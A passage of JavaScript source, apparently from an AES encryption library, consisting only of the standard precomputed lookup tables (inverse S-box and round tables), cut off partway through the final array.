  var Si = [82, 9, 106, 213, 48, 54, 165, 56, 191, 64, 163, 158, 129, 243, 215, 251, 124, 227, 57, 130, 155, 47, 255, 135, 52, 142, 67, 68, 196, 222, 233, 203, 84, 123, 148, 50, 166, 194, 35, 61, 238, 76, 149, 11, 66, 250, 195, 78, 8, 46, 161, 102, 40, 217, 36, 178, 118, 91, 162, 73, 109, 139, 209, 37, 114, 248, 246, 100, 134, 104, 152, 22, 212, 164, 92, 204, 93, 101, 182, 146, 108, 112, 72, 80, 253, 237, 185, 218, 94, 21, 70, 87, 167, 141, 157, 132, 144, 216, 171, 0, 140, 188, 211, 10, 247, 228, 88, 5, 184, 179, 69, 6, 208, 44, 30, 143, 202, 63, 15, 2, 193, 175, 189, 3, 1, 19, 138, 107, 58, 145, 17, 65, 79, 103, 220, 234, 151, 242, 207, 206, 240, 180, 230, 115, 150, 172, 116, 34, 231, 173, 53, 133, 226, 249, 55, 232, 28, 117, 223, 110, 71, 241, 26, 113, 29, 41, 197, 137, 111, 183, 98, 14, 170, 24, 190, 27, 252, 86, 62, 75, 198, 210, 121, 32, 154, 219, 192, 254, 120, 205, 90, 244, 31, 221, 168, 51, 136, 7, 199, 49, 177, 18, 16, 89, 39, 128, 236, 95, 96, 81, 127, 169, 25, 181, 74, 13, 45, 229, 122, 159, 147, 201, 156, 239, 160, 224, 59, 77, 174, 42, 245, 176, 200, 235, 187, 60, 131, 83, 153, 97, 23, 43, 4, 126, 186, 119, 214, 38, 225, 105, 20, 99, 85, 33, 12, 125];
  var T1 = [3328402341, 4168907908, 4000806809, 4135287693, 4294111757, 3597364157, 3731845041, 2445657428, 1613770832, 33620227, 3462883241, 1445669757, 3892248089, 3050821474, 1303096294, 3967186586, 2412431941, 528646813, 2311702848, 4202528135, 4026202645, 2992200171, 2387036105, 4226871307, 1101901292, 3017069671, 1604494077, 1169141738, 597466303, 1403299063, 3832705686, 2613100635, 1974974402, 3791519004, 1033081774, 1277568618, 1815492186, 2118074177, 4126668546, 2211236943, 1748251740, 1369810420, 3521504564, 4193382664, 3799085459, 2883115123, 1647391059, 706024767, 134480908, 2512897874, 1176707941, 2646852446, 806885416, 932615841, 168101135, 798661301, 235341577, 605164086, 461406363, 3756188221, 3454790438, 1311188841, 2142417613, 3933566367, 302582043, 495158174, 1479289972, 874125870, 907746093, 3698224818, 3025820398, 1537253627, 2756858614, 1983593293, 3084310113, 2108928974, 1378429307, 3722699582, 1580150641, 327451799, 2790478837, 3117535592, 0, 3253595436, 1075847264, 3825007647, 2041688520, 3059440621, 3563743934, 2378943302, 1740553945, 1916352843, 2487896798, 2555137236, 2958579944, 2244988746, 3151024235, 3320835882, 1336584933, 3992714006, 2252555205, 2588757463, 1714631509, 293963156, 2319795663, 3925473552, 67240454, 4269768577, 2689618160, 2017213508, 631218106, 1269344483, 2723238387, 1571005438, 2151694528, 93294474, 1066570413, 563977660, 1882732616, 4059428100, 1673313503, 2008463041, 2950355573, 1109467491, 537923632, 3858759450, 4260623118, 3218264685, 2177748300, 403442708, 638784309, 3287084079, 3193921505, 899127202, 2286175436, 773265209, 2479146071, 1437050866, 4236148354, 2050833735, 3362022572, 3126681063, 840505643, 3866325909, 3227541664, 427917720, 2655997905, 2749160575, 1143087718, 1412049534, 999329963, 193497219, 2353415882, 3354324521, 1807268051, 672404540, 2816401017, 3160301282, 369822493, 2916866934, 3688947771, 1681011286, 1949973070, 336202270, 2454276571, 201721354, 1210328172, 3093060836, 2680341085, 3184776046, 1135389935, 3294782118, 965841320, 831886756, 3554993207, 4068047243, 3588745010, 2345191491, 1849112409, 3664604599, 26054028, 2983581028, 2622377682, 1235855840, 3630984372, 2891339514, 4092916743, 3488279077, 3395642799, 4101667470, 1202630377, 268961816, 1874508501, 4034427016, 1243948399, 1546530418, 941366308, 1470539505, 1941222599, 2546386513, 3421038627, 2715671932, 3899946140, 1042226977, 2521517021, 1639824860, 227249030, 260737669, 3765465232, 2084453954, 1907733956, 3429263018, 2420656344, 100860677, 4160157185, 470683154, 3261161891, 1781871967, 2924959737, 1773779408, 394692241, 2579611992, 974986535, 664706745, 3655459128, 3958962195, 731420851, 571543859, 3530123707, 2849626480, 126783113, 865375399, 765172662, 1008606754, 361203602, 3387549984, 2278477385, 2857719295, 1344809080, 2782912378, 59542671, 1503764984, 160008576, 437062935, 1707065306, 3622233649, 2218934982, 3496503480, 2185314755, 697932208, 1512910199, 504303377, 2075177163, 2824099068, 1841019862, 739644986];
  var T2 = [2781242211, 2230877308, 2582542199, 2381740923, 234877682, 3184946027, 2984144751, 1418839493, 1348481072, 50462977, 2848876391, 2102799147, 434634494, 1656084439, 3863849899, 2599188086, 1167051466, 2636087938, 1082771913, 2281340285, 368048890, 3954334041, 3381544775, 201060592, 3963727277, 1739838676, 4250903202, 3930435503, 3206782108, 4149453988, 2531553906, 1536934080, 3262494647, 484572669, 2923271059, 1783375398, 1517041206, 1098792767, 49674231, 1334037708, 1550332980, 4098991525, 886171109, 150598129, 2481090929, 1940642008, 1398944049, 1059722517, 201851908, 1385547719, 1699095331, 1587397571, 674240536, 2704774806, 252314885, 3039795866, 151914247, 908333586, 2602270848, 1038082786, 651029483, 1766729511, 3447698098, 2682942837, 454166793, 2652734339, 1951935532, 775166490, 758520603, 3000790638, 4004797018, 4217086112, 4137964114, 1299594043, 1639438038, 3464344499, 2068982057, 1054729187, 1901997871, 2534638724, 4121318227, 1757008337, 0, 750906861, 1614815264, 535035132, 3363418545, 3988151131, 3201591914, 1183697867, 3647454910, 1265776953, 3734260298, 3566750796, 3903871064, 1250283471, 1807470800, 717615087, 3847203498, 384695291, 3313910595, 3617213773, 1432761139, 2484176261, 3481945413, 283769337, 100925954, 2180939647, 4037038160, 1148730428, 3123027871, 3813386408, 4087501137, 4267549603, 3229630528, 2315620239, 2906624658, 3156319645, 1215313976, 82966005, 3747855548, 3245848246, 1974459098, 1665278241, 807407632, 451280895, 251524083, 1841287890, 1283575245, 337120268, 891687699, 801369324, 3787349855, 2721421207, 3431482436, 959321879, 1469301956, 4065699751, 2197585534, 1199193405, 2898814052, 3887750493, 724703513, 2514908019, 2696962144, 2551808385, 3516813135, 2141445340, 1715741218, 2119445034, 2872807568, 2198571144, 3398190662, 700968686, 3547052216, 1009259540, 2041044702, 3803995742, 487983883, 1991105499, 1004265696, 1449407026, 1316239930, 504629770, 3683797321, 168560134, 1816667172, 3837287516, 1570751170, 1857934291, 4014189740, 2797888098, 2822345105, 2754712981, 936633572, 2347923833, 852879335, 1133234376, 1500395319, 3084545389, 2348912013, 1689376213, 3533459022, 3762923945, 3034082412, 4205598294, 133428468, 634383082, 2949277029, 2398386810, 3913789102, 403703816, 3580869306, 2297460856, 1867130149, 1918643758, 607656988, 4049053350, 3346248884, 1368901318, 600565992, 2090982877, 2632479860, 557719327, 3717614411, 3697393085, 2249034635, 2232388234, 2430627952, 1115438654, 3295786421, 2865522278, 3633334344, 84280067, 33027830, 303828494, 2747425121, 1600795957, 4188952407, 3496589753, 2434238086, 1486471617, 658119965, 3106381470, 953803233, 334231800, 3005978776, 857870609, 3151128937, 1890179545, 2298973838, 2805175444, 3056442267, 574365214, 2450884487, 550103529, 1233637070, 4289353045, 2018519080, 2057691103, 2399374476, 4166623649, 2148108681, 387583245, 3664101311, 836232934, 3330556482, 3100665960, 3280093505, 2955516313, 2002398509, 287182607, 3413881008, 4238890068, 3597515707, 975967766];
  var T3 = [1671808611, 2089089148, 2006576759, 2072901243, 4061003762, 1807603307, 1873927791, 3310653893, 810573872, 16974337, 1739181671, 729634347, 4263110654, 3613570519, 2883997099, 1989864566, 3393556426, 2191335298, 3376449993, 2106063485, 4195741690, 1508618841, 1204391495, 4027317232, 2917941677, 3563566036, 2734514082, 2951366063, 2629772188, 2767672228, 1922491506, 3227229120, 3082974647, 4246528509, 2477669779, 644500518, 911895606, 1061256767, 4144166391, 3427763148, 878471220, 2784252325, 3845444069, 4043897329, 1905517169, 3631459288, 827548209, 356461077, 67897348, 3344078279, 593839651, 3277757891, 405286936, 2527147926, 84871685, 2595565466, 118033927, 305538066, 2157648768, 3795705826, 3945188843, 661212711, 2999812018, 1973414517, 152769033, 2208177539, 745822252, 439235610, 455947803, 1857215598, 1525593178, 2700827552, 1391895634, 994932283, 3596728278, 3016654259, 695947817, 3812548067, 795958831, 2224493444, 1408607827, 3513301457, 0, 3979133421, 543178784, 4229948412, 2982705585, 1542305371, 1790891114, 3410398667, 3201918910, 961245753, 1256100938, 1289001036, 1491644504, 3477767631, 3496721360, 4012557807, 2867154858, 4212583931, 1137018435, 1305975373, 861234739, 2241073541, 1171229253, 4178635257, 33948674, 2139225727, 1357946960, 1011120188, 2679776671, 2833468328, 1374921297, 2751356323, 1086357568, 2408187279, 2460827538, 2646352285, 944271416, 4110742005, 3168756668, 3066132406, 3665145818, 560153121, 271589392, 4279952895, 4077846003, 3530407890, 3444343245, 202643468, 322250259, 3962553324, 1608629855, 2543990167, 1154254916, 389623319, 3294073796, 2817676711, 2122513534, 1028094525, 1689045092, 1575467613, 422261273, 1939203699, 1621147744, 2174228865, 1339137615, 3699352540, 577127458, 712922154, 2427141008, 2290289544, 1187679302, 3995715566, 3100863416, 339486740, 3732514782, 1591917662, 186455563, 3681988059, 3762019296, 844522546, 978220090, 169743370, 1239126601, 101321734, 611076132, 1558493276, 3260915650, 3547250131, 2901361580, 1655096418, 2443721105, 2510565781, 3828863972, 2039214713, 3878868455, 3359869896, 928607799, 1840765549, 2374762893, 3580146133, 1322425422, 2850048425, 1823791212, 1459268694, 4094161908, 3928346602, 1706019429, 2056189050, 2934523822, 135794696, 3134549946, 2022240376, 628050469, 779246638, 472135708, 2800834470, 3032970164, 3327236038, 3894660072, 3715932637, 1956440180, 522272287, 1272813131, 3185336765, 2340818315, 2323976074, 1888542832, 1044544574, 3049550261, 1722469478, 1222152264, 50660867, 4127324150, 236067854, 1638122081, 895445557, 1475980887, 3117443513, 2257655686, 3243809217, 489110045, 2662934430, 3778599393, 4162055160, 2561878936, 288563729, 1773916777, 3648039385, 2391345038, 2493985684, 2612407707, 505560094, 2274497927, 3911240169, 3460925390, 1442818645, 678973480, 3749357023, 2358182796, 2717407649, 2306869641, 219617805, 3218761151, 3862026214, 1120306242, 1756942440, 1103331905, 2578459033, 762796589, 252780047, 2966125488, 1425844308, 3151392187, 372911126];
  var T4 = [1667474886, 2088535288, 2004326894, 2071694838, 4075949567, 1802223062, 1869591006, 3318043793, 808472672, 16843522, 1734846926, 724270422, 4278065639, 3621216949, 2880169549, 1987484396, 3402253711, 2189597983, 3385409673, 2105378810, 4210693615, 1499065266, 1195886990, 4042263547, 2913856577, 3570689971, 2728590687, 2947541573, 2627518243, 2762274643, 1920112356, 3233831835, 3082273397, 4261223649, 2475929149, 640051788, 909531756, 1061110142, 4160160501, 3435941763, 875846760, 2779116625, 3857003729, 4059105529, 1903268834, 3638064043, 825316194, 353713962, 67374088, 3351728789, 589522246, 3284360861, 404236336, 2526454071, 84217610, 2593830191, 117901582, 303183396, 2155911963, 3806477791, 3958056653, 656894286, 2998062463, 1970642922, 151591698, 2206440989, 741110872, 437923380, 454765878, 1852748508, 1515908788, 2694904667, 1381168804, 993742198, 3604373943, 3014905469, 690584402, 3823320797, 791638366, 2223281939, 1398011302, 3520161977, 0, 3991743681, 538992704, 4244381667, 2981218425, 1532751286, 1785380564, 3419096717, 3200178535, 960056178, 1246420628, 1280103576, 1482221744, 3486468741, 3503319995, 4025428677, 2863326543, 4227536621, 1128514950, 1296947098, 859002214, 2240123921, 1162203018, 4193849577, 33687044, 2139062782, 1347481760, 1010582648, 2678045221, 2829640523, 1364325282, 2745433693, 1077985408, 2408548869, 2459086143, 2644360225, 943212656, 4126475505, 3166494563, 3065430391, 3671750063, 555836226, 269496352, 4294908645, 4092792573, 3537006015, 3452783745, 202118168, 320025894, 3974901699, 1600119230, 2543297077, 1145359496, 387397934, 3301201811, 2812801621, 2122220284, 1027426170, 1684319432, 1566435258, 421079858, 1936954854, 1616945344, 2172753945, 1330631070, 3705438115, 572679748, 707427924, 2425400123, 2290647819, 1179044492, 4008585671, 3099120491, 336870440, 3739122087, 1583276732, 185277718, 3688593069, 3772791771, 842159716, 976899700, 168435220, 1229577106, 101059084, 606366792, 1549591736, 3267517855, 3553849021, 2897014595, 1650632388, 2442242105, 2509612081, 3840161747, 2038008818, 3890688725, 3368567691, 926374254, 1835907034, 2374863873, 3587531953, 1313788572, 2846482505, 1819063512, 1448540844, 4109633523, 3941213647, 1701162954, 2054852340, 2930698567, 134748176, 3132806511, 2021165296, 623210314, 774795868, 471606328, 2795958615, 3031746419, 3334885783, 3907527627, 3722280097, 1953799400, 522133822, 1263263126, 3183336545, 2341176845, 2324333839, 1886425312, 1044267644, 3048588401, 1718004428, 1212733584, 50529542, 4143317495, 235803164, 1633788866, 892690282, 1465383342, 3115962473, 2256965911, 3250673817, 488449850, 2661202215, 3789633753, 4177007595, 2560144171, 286339874, 1768537042, 3654906025, 2391705863, 2492770099, 2610673197, 505291324, 2273808917, 3924369609, 3469625735, 1431699370, 673740880, 3755965093, 2358021891, 2711746649, 2307489801, 218961690, 3217021541, 3873845719, 1111672452, 1751693520, 1094828930, 2576986153, 757954394, 252645662, 2964376443, 1414855848, 3149649517, 370555436];
  var T5 = [1374988112, 2118214995, 437757123, 975658646, 1001089995, 530400753, 2902087851, 1273168787, 540080725, 2910219766, 2295101073, 4110568485, 1340463100, 3307916247, 641025152, 3043140495, 3736164937, 632953703, 1172967064, 1576976609, 3274667266, 2169303058, 2370213795, 1809054150, 59727847, 361929877, 3211623147, 2505202138, 3569255213, 1484005843, 1239443753, 2395588676, 1975683434, 4102977912, 2572697195, 666464733, 3202437046, 4035489047, 3374361702, 2110667444, 1675577880, 3843699074, 2538681184, 1649639237, 2976151520, 3144396420, 4269907996, 4178062228, 1883793496, 2403728665, 2497604743, 1383856311, 2876494627, 1917518562, 3810496343, 1716890410, 3001755655, 800440835, 2261089178, 3543599269, 807962610, 599762354, 33778362, 3977675356, 2328828971, 2809771154, 4077384432, 1315562145, 1708848333, 101039829, 3509871135, 3299278474, 875451293, 2733856160, 92987698, 2767645557, 193195065, 1080094634, 1584504582, 3178106961, 1042385657, 2531067453, 3711829422, 1306967366, 2438237621, 1908694277, 67556463, 1615861247, 429456164, 3602770327, 2302690252, 1742315127, 2968011453, 126454664, 3877198648, 2043211483, 2709260871, 2084704233, 4169408201, 0, 159417987, 841739592, 504459436, 1817866830, 4245618683, 260388950, 1034867998, 908933415, 168810852, 1750902305, 2606453969, 607530554, 202008497, 2472011535, 3035535058, 463180190, 2160117071, 1641816226, 1517767529, 470948374, 3801332234, 3231722213, 1008918595, 303765277, 235474187, 4069246893, 766945465, 337553864, 1475418501, 2943682380, 4003061179, 2743034109, 4144047775, 1551037884, 1147550661, 1543208500, 2336434550, 3408119516, 3069049960, 3102011747, 3610369226, 1113818384, 328671808, 2227573024, 2236228733, 3535486456, 2935566865, 3341394285, 496906059, 3702665459, 226906860, 2009195472, 733156972, 2842737049, 294930682, 1206477858, 2835123396, 2700099354, 1451044056, 573804783, 2269728455, 3644379585, 2362090238, 2564033334, 2801107407, 2776292904, 3669462566, 1068351396, 742039012, 1350078989, 1784663195, 1417561698, 4136440770, 2430122216, 775550814, 2193862645, 2673705150, 1775276924, 1876241833, 3475313331, 3366754619, 270040487, 3902563182, 3678124923, 3441850377, 1851332852, 3969562369, 2203032232, 3868552805, 2868897406, 566021896, 4011190502, 3135740889, 1248802510, 3936291284, 699432150, 832877231, 708780849, 3332740144, 899835584, 1951317047, 4236429990, 3767586992, 866637845, 4043610186, 1106041591, 2144161806, 395441711, 1984812685, 1139781709, 3433712980, 3835036895, 2664543715, 1282050075, 3240894392, 1181045119, 2640243204, 25965917, 4203181171, 4211818798, 3009879386, 2463879762, 3910161971, 1842759443, 2597806476, 933301370, 1509430414, 3943906441, 3467192302, 3076639029, 3776767469, 2051518780, 2631065433, 1441952575, 404016761, 1942435775, 1408749034, 1610459739, 3745345300, 2017778566, 3400528769, 3110650942, 941896748, 3265478751, 371049330, 3168937228, 675039627, 4279080257, 967311729, 135050206, 3635733660, 1683407248, 2076935265, 3576870512, 1215061108, 3501741890];
  var T6 = [1347548327, 1400783205, 3273267108, 2520393566, 3409685355, 4045380933, 2880240216, 2471224067, 1428173050, 4138563181, 2441661558, 636813900, 4233094615, 3620022987, 2149987652, 2411029155, 1239331162, 1730525723, 2554718734, 3781033664, 46346101, 310463728, 2743944855, 3328955385, 3875770207, 2501218972, 3955191162, 3667219033, 768917123, 3545789473, 692707433, 1150208456, 1786102409, 2029293177, 1805211710, 3710368113, 3065962831, 401639597, 1724457132, 3028143674, 409198410, 2196052529, 1620529459, 1164071807, 3769721975, 2226875310, 486441376, 2499348523, 1483753576, 428819965, 2274680428, 3075636216, 598438867, 3799141122, 1474502543, 711349675, 129166120, 53458370, 2592523643, 2782082824, 4063242375, 2988687269, 3120694122, 1559041666, 730517276, 2460449204, 4042459122, 2706270690, 3446004468, 3573941694, 533804130, 2328143614, 2637442643, 2695033685, 839224033, 1973745387, 957055980, 2856345839, 106852767, 1371368976, 4181598602, 1033297158, 2933734917, 1179510461, 3046200461, 91341917, 1862534868, 4284502037, 605657339, 2547432937, 3431546947, 2003294622, 3182487618, 2282195339, 954669403, 3682191598, 1201765386, 3917234703, 3388507166, 0, 2198438022, 1211247597, 2887651696, 1315723890, 4227665663, 1443857720, 507358933, 657861945, 1678381017, 560487590, 3516619604, 975451694, 2970356327, 261314535, 3535072918, 2652609425, 1333838021, 2724322336, 1767536459, 370938394, 182621114, 3854606378, 1128014560, 487725847, 185469197, 2918353863, 3106780840, 3356761769, 2237133081, 1286567175, 3152976349, 4255350624, 2683765030, 3160175349, 3309594171, 878443390, 1988838185, 3704300486, 1756818940, 1673061617, 3403100636, 272786309, 1075025698, 545572369, 2105887268, 4174560061, 296679730, 1841768865, 1260232239, 4091327024, 3960309330, 3497509347, 1814803222, 2578018489, 4195456072, 575138148, 3299409036, 446754879, 3629546796, 4011996048, 3347532110, 3252238545, 4270639778, 915985419, 3483825537, 681933534, 651868046, 2755636671, 3828103837, 223377554, 2607439820, 1649704518, 3270937875, 3901806776, 1580087799, 4118987695, 3198115200, 2087309459, 2842678573, 3016697106, 1003007129, 2802849917, 1860738147, 2077965243, 164439672, 4100872472, 32283319, 2827177882, 1709610350, 2125135846, 136428751, 3874428392, 3652904859, 3460984630, 3572145929, 3593056380, 2939266226, 824852259, 818324884, 3224740454, 930369212, 2801566410, 2967507152, 355706840, 1257309336, 4148292826, 243256656, 790073846, 2373340630, 1296297904, 1422699085, 3756299780, 3818836405, 457992840, 3099667487, 2135319889, 77422314, 1560382517, 1945798516, 788204353, 1521706781, 1385356242, 870912086, 325965383, 2358957921, 2050466060, 2388260884, 2313884476, 4006521127, 901210569, 3990953189, 1014646705, 1503449823, 1062597235, 2031621326, 3212035895, 3931371469, 1533017514, 350174575, 2256028891, 2177544179, 1052338372, 741876788, 1606591296, 1914052035, 213705253, 2334669897, 1107234197, 1899603969, 3725069491, 2631447780, 2422494913, 1635502980, 1893020342, 1950903388, 1120974935];
  var T7 = [2807058932, 1699970625, 2764249623, 1586903591, 1808481195, 1173430173, 1487645946, 59984867, 4199882800, 1844882806, 1989249228, 1277555970, 3623636965, 3419915562, 1149249077, 2744104290, 1514790577, 459744698, 244860394, 3235995134, 1963115311, 4027744588, 2544078150, 4190530515, 1608975247, 2627016082, 2062270317, 1507497298, 2200818878, 567498868, 1764313568, 3359936201, 2305455554, 2037970062, 1047239e3, 1910319033, 1337376481, 2904027272, 2892417312, 984907214, 1243112415, 830661914, 861968209, 2135253587, 2011214180, 2927934315, 2686254721, 731183368, 1750626376, 4246310725, 1820824798, 4172763771, 3542330227, 48394827, 2404901663, 2871682645, 671593195, 3254988725, 2073724613, 145085239, 2280796200, 2779915199, 1790575107, 2187128086, 472615631, 3029510009, 4075877127, 3802222185, 4107101658, 3201631749, 1646252340, 4270507174, 1402811438, 1436590835, 3778151818, 3950355702, 3963161475, 4020912224, 2667994737, 273792366, 2331590177, 104699613, 95345982, 3175501286, 2377486676, 1560637892, 3564045318, 369057872, 4213447064, 3919042237, 1137477952, 2658625497, 1119727848, 2340947849, 1530455833, 4007360968, 172466556, 266959938, 516552836, 0, 2256734592, 3980931627, 1890328081, 1917742170, 4294704398, 945164165, 3575528878, 958871085, 3647212047, 2787207260, 1423022939, 775562294, 1739656202, 3876557655, 2530391278, 2443058075, 3310321856, 547512796, 1265195639, 437656594, 3121275539, 719700128, 3762502690, 387781147, 218828297, 3350065803, 2830708150, 2848461854, 428169201, 122466165, 3720081049, 1627235199, 648017665, 4122762354, 1002783846, 2117360635, 695634755, 3336358691, 4234721005, 4049844452, 3704280881, 2232435299, 574624663, 287343814, 612205898, 1039717051, 840019705, 2708326185, 793451934, 821288114, 1391201670, 3822090177, 376187827, 3113855344, 1224348052, 1679968233, 2361698556, 1058709744, 752375421, 2431590963, 1321699145, 3519142200, 2734591178, 188127444, 2177869557, 3727205754, 2384911031, 3215212461, 2648976442, 2450346104, 3432737375, 1180849278, 331544205, 3102249176, 4150144569, 2952102595, 2159976285, 2474404304, 766078933, 313773861, 2570832044, 2108100632, 1668212892, 3145456443, 2013908262, 418672217, 3070356634, 2594734927, 1852171925, 3867060991, 3473416636, 3907448597, 2614737639, 919489135, 164948639, 2094410160, 2997825956, 590424639, 2486224549, 1723872674, 3157750862, 3399941250, 3501252752, 3625268135, 2555048196, 3673637356, 1343127501, 4130281361, 3599595085, 2957853679, 1297403050, 81781910, 3051593425, 2283490410, 532201772, 1367295589, 3926170974, 895287692, 1953757831, 1093597963, 492483431, 3528626907, 1446242576, 1192455638, 1636604631, 209336225, 344873464, 1015671571, 669961897, 3375740769, 3857572124, 2973530695, 3747192018, 1933530610, 3464042516, 935293895, 3454686199, 2858115069, 1863638845, 3683022916, 4085369519, 3292445032, 875313188, 1080017571, 3279033885, 621591778, 1233856572, 2504130317, 24197544, 3017672716, 3835484340, 3247465558, 2220981195, 3060847922, 1551124588, 1463996600];
  var T8 = [4104605777, 1097159550, 396673818, 660510266, 2875968315, 2638606623, 4200115116, 3808662347, 821712160, 1986918061, 3430322568, 38544885, 3856137295, 718002117, 893681702, 1654886325, 2975484382, 3122358053, 3926825029, 4274053469, 796197571, 1290801793, 1184342925, 3556361835, 2405426947, 2459735317, 1836772287, 1381620373, 3196267988, 1948373848, 3764988233, 3385345166, 3263785589, 2390325492, 1480485785, 3111247143, 3780097726, 2293045232, 548169417, 3459953789, 3746175075, 439452389, 1362321559, 1400849762, 1685577905, 1806599355, 2174754046, 137073913, 1214797936, 1174215055, 3731654548, 2079897426, 1943217067, 1258480242, 529487843, 1437280870, 3945269170, 3049390895, 3313212038, 923313619, 679998e3, 3215307299, 57326082, 377642221, 3474729866, 2041877159, 133361907, 1776460110, 3673476453, 96392454, 878845905, 2801699524, 777231668, 4082475170, 2330014213, 4142626212, 2213296395, 1626319424, 1906247262, 1846563261, 562755902, 3708173718, 1040559837, 3871163981, 1418573201, 3294430577, 114585348, 1343618912, 2566595609, 3186202582, 1078185097, 3651041127, 3896688048, 2307622919, 425408743, 3371096953, 2081048481, 1108339068, 2216610296, 0, 2156299017, 736970802, 292596766, 1517440620, 251657213, 2235061775, 2933202493, 758720310, 265905162, 1554391400, 1532285339, 908999204, 174567692, 1474760595, 4002861748, 2610011675, 3234156416, 3693126241, 2001430874, 303699484, 2478443234, 2687165888, 585122620, 454499602, 151849742, 2345119218, 3064510765, 514443284, 4044981591, 1963412655, 2581445614, 2137062819, 19308535, 1928707164, 1715193156, 4219352155, 1126790795, 600235211, 3992742070, 3841024952, 836553431, 1669664834, 2535604243, 3323011204, 1243905413, 3141400786, 4180808110, 698445255, 2653899549, 2989552604, 2253581325, 3252932727, 3004591147, 1891211689, 2487810577, 3915653703, 4237083816, 4030667424, 2100090966, 865136418, 1229899655, 953270745, 3399679628, 3557504664, 4118925222, 2061379749, 3079546586, 2915017791, 983426092, 2022837584, 1607244650, 2118541908, 2366882550, 3635996816, 972512814, 3283088770, 1568718495, 3499326569, 3576539503, 621982671, 2895723464, 410887952, 2623762152, 1002142683, 645401037, 1494807662, 2595684844, 1335535747, 2507040230, 4293295786, 3167684641, 367585007, 3885750714, 1865862730, 2668221674, 2960971305, 2763173681, 1059270954, 2777952454, 2724642869, 1320957812, 2194319100, 2429595872, 2815956275, 77089521, 3973773121, 3444575871, 2448830231, 1305906550, 4021308739, 2857194700, 2516901860, 3518358430, 1787304780, 740276417, 1699839814, 1592394909, 2352307457, 2272556026, 188821243, 1729977011, 3687994002, 274084841, 3594982253, 3613494426, 2701949495, 4162096729, 322734571, 2837966542, 1640576439, 484830689, 1202797690, 3537852828, 4067639125, 349075736, 3342319475, 4157467219, 4255800159, 1030690015, 1155237496, 2951971274, 1757691577, 607398968, 2738905026, 499347990, 3794078908, 1011452712, 227885567, 2818666809, 213114376, 3034881240, 1455525988, 3414450555, 850817237, 1817998408, 3092726480];
  var U1 = [0, 235474187, 470948374, 303765277, 941896748, 908933415, 607530554, 708780849, 1883793496, 2118214995, 1817866830, 1649639237, 1215061108, 1181045119, 1417561698, 1517767529, 3767586992, 4003061179, 4236429990, 4069246893, 3635733660, 3602770327, 3299278474, 3400528769, 2430122216, 2664543715, 2362090238, 2193862645, 2835123396, 2801107407, 3035535058, 3135740889, 3678124923, 3576870512, 3341394285, 3374361702, 3810496343, 3977675356, 4279080257, 4043610186, 2876494627, 2776292904, 3076639029, 3110650942, 2472011535, 2640243204, 2403728665, 2169303058, 1001089995, 899835584, 666464733, 699432150, 59727847, 226906860, 530400753, 294930682, 1273168787, 1172967064, 1475418501, 1509430414, 1942435775, 2110667444, 1876241833, 1641816226, 2910219766, 2743034109, 2976151520, 3211623147, 2505202138, 2606453969, 2302690252, 2269728455, 3711829422, 3543599269, 3240894392, 3475313331, 3843699074, 3943906441, 4178062228, 4144047775, 1306967366, 1139781709, 1374988112, 1610459739, 1975683434, 2076935265, 1775276924, 1742315127, 1034867998, 866637845, 566021896, 800440835, 92987698, 193195065, 429456164, 395441711, 1984812685, 2017778566, 1784663195, 1683407248, 1315562145, 1080094634, 1383856311, 1551037884, 101039829, 135050206, 437757123, 337553864, 1042385657, 807962610, 573804783, 742039012, 2531067453, 2564033334, 2328828971, 2227573024, 2935566865, 2700099354, 3001755655, 3168937228, 3868552805, 3902563182, 4203181171, 4102977912, 3736164937, 3501741890, 3265478751, 3433712980, 1106041591, 1340463100, 1576976609, 1408749034, 2043211483, 2009195472, 1708848333, 1809054150, 832877231, 1068351396, 766945465, 599762354, 159417987, 126454664, 361929877, 463180190, 2709260871, 2943682380, 3178106961, 3009879386, 2572697195, 2538681184, 2236228733, 2336434550, 3509871135, 3745345300, 3441850377, 3274667266, 3910161971, 3877198648, 4110568485, 4211818798, 2597806476, 2497604743, 2261089178, 2295101073, 2733856160, 2902087851, 3202437046, 2968011453, 3936291284, 3835036895, 4136440770, 4169408201, 3535486456, 3702665459, 3467192302, 3231722213, 2051518780, 1951317047, 1716890410, 1750902305, 1113818384, 1282050075, 1584504582, 1350078989, 168810852, 67556463, 371049330, 404016761, 841739592, 1008918595, 775550814, 540080725, 3969562369, 3801332234, 4035489047, 4269907996, 3569255213, 3669462566, 3366754619, 3332740144, 2631065433, 2463879762, 2160117071, 2395588676, 2767645557, 2868897406, 3102011747, 3069049960, 202008497, 33778362, 270040487, 504459436, 875451293, 975658646, 675039627, 641025152, 2084704233, 1917518562, 1615861247, 1851332852, 1147550661, 1248802510, 1484005843, 1451044056, 933301370, 967311729, 733156972, 632953703, 260388950, 25965917, 328671808, 496906059, 1206477858, 1239443753, 1543208500, 1441952575, 2144161806, 1908694277, 1675577880, 1842759443, 3610369226, 3644379585, 3408119516, 3307916247, 4011190502, 3776767469, 4077384432, 4245618683, 2809771154, 2842737049, 3144396420, 3043140495, 2673705150, 2438237621, 2203032232, 2370213795];
  var U2 = [0, 185469197, 370938394, 487725847, 741876788, 657861945, 975451694, 824852259, 1483753576, 1400783205, 1315723890, 1164071807, 1950903388, 2135319889, 1649704518, 1767536459, 2967507152, 3152976349, 2801566410, 2918353863, 2631447780, 2547432937, 2328143614, 2177544179, 3901806776, 3818836405, 4270639778, 4118987695, 3299409036, 3483825537, 3535072918, 3652904859, 2077965243, 1893020342, 1841768865, 1724457132, 1474502543, 1559041666, 1107234197, 1257309336, 598438867, 681933534, 901210569, 1052338372, 261314535, 77422314, 428819965, 310463728, 3409685355, 3224740454, 3710368113, 3593056380, 3875770207, 3960309330, 4045380933, 4195456072, 2471224067, 2554718734, 2237133081, 2388260884, 3212035895, 3028143674, 2842678573, 2724322336, 4138563181, 4255350624, 3769721975, 3955191162, 3667219033, 3516619604, 3431546947, 3347532110, 2933734917, 2782082824, 3099667487, 3016697106, 2196052529, 2313884476, 2499348523, 2683765030, 1179510461, 1296297904, 1347548327, 1533017514, 1786102409, 1635502980, 2087309459, 2003294622, 507358933, 355706840, 136428751, 53458370, 839224033, 957055980, 605657339, 790073846, 2373340630, 2256028891, 2607439820, 2422494913, 2706270690, 2856345839, 3075636216, 3160175349, 3573941694, 3725069491, 3273267108, 3356761769, 4181598602, 4063242375, 4011996048, 3828103837, 1033297158, 915985419, 730517276, 545572369, 296679730, 446754879, 129166120, 213705253, 1709610350, 1860738147, 1945798516, 2029293177, 1239331162, 1120974935, 1606591296, 1422699085, 4148292826, 4233094615, 3781033664, 3931371469, 3682191598, 3497509347, 3446004468, 3328955385, 2939266226, 2755636671, 3106780840, 2988687269, 2198438022, 2282195339, 2501218972, 2652609425, 1201765386, 1286567175, 1371368976, 1521706781, 1805211710, 1620529459, 2105887268, 1988838185, 